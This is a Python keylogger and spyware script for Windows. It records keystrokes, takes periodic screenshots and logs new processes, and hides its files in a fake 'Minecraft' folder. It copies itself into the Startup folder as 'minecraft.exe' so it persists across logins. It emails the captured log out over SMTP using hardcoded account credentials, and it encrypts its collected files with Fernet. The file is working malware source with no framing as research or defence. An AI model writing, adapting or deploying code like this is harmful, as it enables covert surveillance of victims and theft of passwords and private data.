

import pynput,pyautogui,time,wmi,shutil,concurrent.futures,multiprocessing
import smtplib,sys,os,getpass,random,time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Key,Listener
from cryptography.fernet import Fernet


def write_key():

    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


def load_key():

    return open("key.key", "rb").read()

def encrypt(filename, key1:bytes):

    f = Fernet(key1)
    with open(filename, "rb") as file:
        
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)

    with open(filename, "wb") as file:
        file.write(encrypted_data)


def decrypt(filename, key1):

    f = Fernet(key1)
    with open(filename, "rb") as file:
        
        encrypted_data = file.read()
    
    decrypted_data = f.decrypt(encrypted_data)
    
    with open(filename, "wb") as file:
        file.write(decrypted_data)


passer = True
krb = getpass.getuser()
os.chdir(r"C:\Users\{}\AppData\Local\Minecraft".format(krb))
for i in os.listdir(os.getcwd()):
    if i == "enc.txt":
        passer = False
if passer:
    scriptfile = __file__
    shutil.copy(scriptfile,r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"+os.sep+"minecraft.exe")
#os.system(r'copy "{scriptfile}" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"'.format(scriptfile))

count = 0
keys = []
subcount = 0
sstopper = True
def on_press(key):
    global count,keys,subcount
    count += 1
    subcount += 1
    print("{0} pressed".format(key))
    keys.append(key)
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []
    #if subcount >= 60:
    #    screenshooter()
    #    subcount = 0

def send_mail(email):
    with open("log.txt","r",encoding="utf-8") as f:
        log = f.read()
        f.close()
    message = MIMEMultipart()

    message["From"] = 'yomer2403@gmail.com'

    message["To"] = email

    message["Subject"] = "Log"

    message_body = MIMEText(log,"plain")

    message.attach(message_body)

    try:
        mail = smtplib.SMTP('smtp.yandex.com.tr:465')
        mail.ehlo()

        mail.starttls()

        mail.login("mmahirmahir@yandex.com","mahir1453")

        mail.sendmail(message["From"],message["To"],message.as_string())
        print("SENT")
        with open("log.txt","a",encoding="utf-8") as f:
            f.write("SENT")
            f.close()
        mail.close()
    except Exception as e:
        sys.stderr.write(f"[EXCEPTİON] {e}")
        sys.stderr.flush()

def write_file(keys):
    user = getpass.getuser()
    path = r"C:\Users\{}\AppData\Local".format(user)
    path2 = r"C:\Users\{}\AppData\Roaming".format(user)
    if os.path.exists(r"C:\Users\{}\AppData\Local".format(user)):
        if not os.path.exists(r"C:\Users\{}\AppData\Local\Minecraft".format(user)):
            os.mkdir(path+"\Minecraft")
        os.chdir(path+"\Minecraft")
        
        
    

    with open("log.txt" , "a" , encoding="utf-8") as file:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("backspace") > 0:
                file.write("")
            elif k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)




def screenshooter():
    global sstopper
    while sstopper:
        time.sleep(60)
        ssid = random.randint(1,1111141412)
        user = getpass.getuser()
        screenshot = pyautogui.screenshot()
        screenshot.save(r"C:\Users\{}\AppData\Local\Minecraft\{}.png".format(user,ssid))


def ovrrdscreenshooter():
    ssid = random.randint(1,1111141412)
    user = getpass.getuser()
    screenshot = pyautogui.screenshot()
    screenshot.save(r"C:\Users\{}\AppData\Local\Minecraft\{}.png".format(user,ssid))



passable = False
def decrypter():
    keycap = False
    global passable
    user = getpass.getuser()
    os.chdir(r"C:\Users\{}\AppData\Local\Minecraft".format(user))
    for checker in os.listdir(os.getcwd()):
        print(checker)
        print(os.getcwd())
        if checker == "enc.txt":
            passable = True
    if passable:
        print("passed")
        pass
    else:
        return
    os.chdir(r"C:\Users\{}\AppData\Local".format(user))
    for i in os.listdir(os.getcwd()):
        if i == "key.key":
            print(i)
            keycap = True
        else:
            pass
    os.chdir(r"C:\Users\{}\AppData\Local\Minecraft".format(user))
    
    if keycap:
        os.chdir(r"C:\Users\{}\AppData\Local".format(user))
        key1 = load_key()
        os.chdir(r"C:\Users\{}\AppData\Local\Minecraft".format(user))
        for i in os.listdir(os.getcwd()):
            print("decrypting",i)
            decrypt(i,key1)
    else:
        pass
            

   

def encrypter():
    keycap = False
    user = getpass.getuser()
    os.chdir(r"C:\Users\{}\AppData\Local".format(user))
    for i in os.listdir(os.getcwd()):
        if i == "key.key":
            keycap = True
        else:
            pass    
     
    if keycap:
        key1 = load_key()
        os.chdir(r"C:\Users\{}\AppData\Local\Minecraft".format(user))

        with open("enc.txt", "w",encoding="utf-8") as f:
            f.write("ppppppppppppppppppppppppppp")
        for i in os.listdir(os.getcwd()):
            
            encrypt(i,key1)
    else:
        os.chdir(r"C:\Users\{}\AppData\Local".format(user))
        write_key()
        key1 = load_key()
        os.chdir(r"C:\Users\{}\AppData\Local\Minecraft".format(user))
        with open("enc.txt", "w",encoding="utf-8") as f:
            f.write("ppppppppppppppppppppppppppp") 
        for i in os.listdir(os.getcwd()):
            encrypt(i,key1)
    
        
    

def processwatcher():
    f = wmi.WMI()

    process_watcher = f.Win32_Process.watch_for("creation")
    
    while sstopper:
        new_process = process_watcher()
        if new_process.Caption != "svchost.exe":
            f.write(f"\nProcess started: {new_process.Caption}\n")



def on_release(key):
    global sstopper
    if key == Key.esc:
        print("exit")
        
        send_mail("habnetzuckemberg@gmail.com")
        sstopper = False
        return False
    

screen = multiprocessing.Process(target=screenshooter)

watcher = multiprocessing.Process(target=processwatcher)

with Listener(on_press = on_press, on_release = on_release) as listener:

    decrypter()
    screen.start()
    watcher.start()
    listener.join()
    screen.close()
    watcher.close()
    
    encrypter()
    sys.exit()
    
